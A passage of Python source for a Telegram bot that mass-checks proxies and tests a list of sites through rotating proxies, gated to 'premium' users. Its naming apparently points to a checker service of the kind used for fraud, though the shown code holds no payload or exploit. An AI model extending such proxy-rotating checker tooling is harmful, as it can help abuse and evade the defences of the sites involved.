    if not KILLER_ALLOWED_USERS(user_id):

        await event.reply(
            premium_emoji(
                "❌ <b>Access Denied</b>\n\n"
                "Only premium users can use this command."
            ),
            parse_mode=html
        )

        return

    proxies = list(set(load_proxies()))

    if not proxies:

        await event.reply(
            premium_emoji(
                "❌ <code>proxy.txt</code> is empty."
            ),
            parse_mode=html
        )

        return

    def normalize_proxy(proxy):

        proxy = proxy.strip()

        if not proxy:
            return None

        # already formatted
        if "://" in proxy:
            return proxy

        parts = proxy.split(":")

        # ip:port
        if len(parts) == 2:

            ip, port = parts

            return f"http://{ip}:{port}"

        # ip:port:user:pass
        elif len(parts) == 4:

            ip, port, user, password = parts

            return f"http://{user}:{password}@{ip}:{port}"

        return None

    total = len(proxies)

    checked = 0

    alive = []
    dead = []

    session_id = str(random.randint(100000, 999999))

    mass_check_events[session_id] = asyncio.Event()

    stop_event = mass_check_events[session_id]

    alive_file = f"/tmp/{session_id}_alive.txt"
    dead_file = f"/tmp/{session_id}_dead.txt"

    progress_msg = await event.reply(
        premium_emoji(
            f"🔥 <b>PROXY CHECK STARTED</b>\n\n"
            f"📦 Total: {total}\n"
            f"✅ Alive: 0\n"
            f"❌ Dead: 0\n"
            f"⏳ Checked: 0/{total}"
        ),
        buttons=[
            [
                Button.inline(
                    "✅ Alive (0)",
                    data=f"proxy_alive_{session_id}"
                ),
                Button.inline(
                    "❌ Dead (0)",
                    data=f"proxy_dead_{session_id}"
                )
            ],
            [
                Button.inline(
                    "🛑 Stop",
                    data=f"proxy_stop_{session_id}"
                )
            ]
        ],
        parse_mode=html
    )

    WORKERS = 100

    semaphore = asyncio.Semaphore(WORKERS)

    async def worker(proxy):

        async with semaphore:

            if stop_event.is_set():
                return None

            try:

                formatted_proxy = normalize_proxy(proxy)

                if not formatted_proxy:

                    return {
                        "proxy": proxy,
                        "status": "dead"
                    }

                result = await test_proxy(formatted_proxy)

                return {
                    "proxy": proxy,
                    "status": result.get("status", "dead")
                }

            except Exception:

                return {
                    "proxy": proxy,
                    "status": "dead"
                }

    try:

        tasks = [
            worker(proxy)
            for proxy in proxies
        ]

        for future in asyncio.as_completed(tasks):

            if stop_event.is_set():

                await progress_msg.edit(
                    premium_emoji(
                        f"🛑 <b>PROXY CHECK STOPPED</b>\n\n"
                        f"📦 Total: {total}\n"
                        f"✅ Alive: {len(alive)}\n"
                        f"❌ Dead: {len(dead)}\n"
                        f"⏳ Checked: {checked}/{total}"
                    ),
                    buttons=[
                        [
                            Button.inline(
                                f"✅ Alive ({len(alive)})",
                                data=f"proxy_alive_{session_id}"
                            ),
                            Button.inline(
                                f"❌ Dead ({len(dead)})",
                                data=f"proxy_dead_{session_id}"
                            )
                        ]
                    ],
                    parse_mode=html
                )

                break

            result = await future

            if result is None:
                continue

            checked += 1

            proxy = result["proxy"]

            if result["status"] == "alive":

                alive.append(proxy)

                async with aiofiles.open(alive_file, "a") as f:
                    await f.write(proxy + "\n")

            else:

                dead.append(proxy)

                async with aiofiles.open(dead_file, "a") as f:
                    await f.write(proxy + "\n")

            if checked % 5 == 0 or checked == total:

                try:

                    await progress_msg.edit(
                        premium_emoji(
                            f"🔥 <b>PROXY CHECK RUNNING</b>\n\n"
                            f"📦 Total: {total}\n"
                            f"✅ Alive: {len(alive)}\n"
                            f"❌ Dead: {len(dead)}\n"
                            f"⏳ Checked: {checked}/{total}\n\n"
                            f"<b>Last:</b>\n"
                            f"<code>{proxy}</code>"
                        ),
                        buttons=[
                            [
                                Button.inline(
                                    f"✅ Alive ({len(alive)})",
                                    data=f"proxy_alive_{session_id}"
                                ),
                                Button.inline(
                                    f"❌ Dead ({len(dead)})",
                                    data=f"proxy_dead_{session_id}"
                                )
                            ],
                            [
                                Button.inline(
                                    "🛑 Stop",
                                    data=f"proxy_stop_{session_id}"
                                )
                            ]
                        ],
                        parse_mode=html
                    )

                except Exception as e:

                    print(f"Edit Error: {e}")

        # overwrite proxy.txt
        async with aiofiles.open(PROXY_FILE, "w") as f:

            for proxy in alive:
                await f.write(proxy + "\n")

        if session_id in mass_check_events:
            del mass_check_events[session_id]

        await progress_msg.edit(
            premium_emoji(
                f"✅ <b>PROXY CHECK COMPLETE</b>\n\n"
                f"📦 Total: {total}\n"
                f"✅ Alive: {len(alive)}\n"
                f"❌ Removed: {len(dead)}\n\n"
                f"<code>proxy.txt</code> updated."
            ),
            buttons=[
                [
                    Button.inline(
                        f"✅ Alive ({len(alive)})",
                        data=f"proxy_alive_{session_id}"
                    ),
                    Button.inline(
                        f"❌ Dead ({len(dead)})",
                        data=f"proxy_dead_{session_id}"
                    )
                ]
            ],
            parse_mode=html
        )

    except Exception as e:

        if session_id in mass_check_events:
            del mass_check_events[session_id]

        await progress_msg.edit(
            premium_emoji(
                f"❌ <b>Proxy Check Failed</b>\n\n"
                f"<code>{str(e)}</code>"
            ),
            parse_mode=html
        )


@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))

    alive_sites = []
    dead_sites = []
    batch_size = 10

    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies: fresh_proxies = proxies

            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]

            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking sites...\n\n"
                    f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                    f"<b>Alive:</b> {len(alive_sites)}\n"
                    f"<b>Dead:</b> {len(dead_sites)}"
                ),
                parse_mode=html
            )

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")

        summary_msg = f"✅ **Site Check Complete!**\n\n"
        summary_msg += f"**Total Sites:** {len(sites)}\n"
        summary_msg += f"**Alive:** {len(alive_sites)}\n"
        summary_msg += f"**Removed:** {len(dead_sites)}\n\n"
        summary_msg += "`sites.txt` has been updated."

        await status_msg.edit(premium_emoji(summary_msg))

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during site check: {e}"))

# Callbacks for Pause/Resume/Stop
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("🛑 Stopped"))
        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))





import threading
import uvicorn

def run_api():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":

    print("✅ Bot + API started successfully!")

    api_thread = threading.Thread(
        target=run_api,
        daemon=True
    )

    api_thread.start()

    bot.run_until_disconnected()
